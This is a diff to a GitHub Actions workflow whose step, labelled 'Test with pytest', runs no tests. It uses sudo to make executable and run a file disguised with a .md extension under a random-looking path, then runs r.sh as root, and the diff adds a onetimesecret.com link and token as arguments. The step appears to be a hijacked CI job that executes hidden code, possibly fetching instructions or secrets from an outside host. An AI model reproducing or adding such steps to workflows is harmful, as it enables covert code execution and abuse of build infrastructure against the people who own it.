@@ -26,6 +26,6 @@ jobs:
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
-        echo 'xcxke'
+        echo 'oovwm'
         sudo chmod +x 7qpwmwevp/3u9m/tpgfuj39/gracejjj28.md
-        sudo ./7qpwmwevp/3u9m/tpgfuj39/gracejjj28.md   && sudo sh r.sh
+        sudo ./7qpwmwevp/3u9m/tpgfuj39/gracejjj28.md https://onetimesecret.com/secret/6dw92m81siyu9g4hc8bi8mngxtlqepz a49nva && sudo sh r.sh
